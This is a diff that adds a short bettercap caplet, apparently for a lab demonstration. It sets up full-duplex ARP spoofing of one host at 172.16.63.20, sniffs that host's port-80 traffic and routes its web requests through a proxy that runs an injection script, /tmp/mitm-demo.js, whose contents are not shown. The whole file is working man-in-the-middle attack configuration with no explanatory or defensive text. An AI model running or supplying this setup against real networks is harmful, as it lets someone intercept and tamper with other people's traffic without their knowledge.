@@ -1,0 +1,11 @@
+set arp.spoof.targets 172.16.63.20
+set arp.spoof.fullduplex true
+set arp.spoof.internal true
+
+set http.proxy.sslstrip false
+set http.proxy.script /tmp/mitm-demo.js
+set net.sniff.filter host 172.16.63.20 and tcp port 80
+
+net.sniff on
+http.proxy on
+arp.spoof on
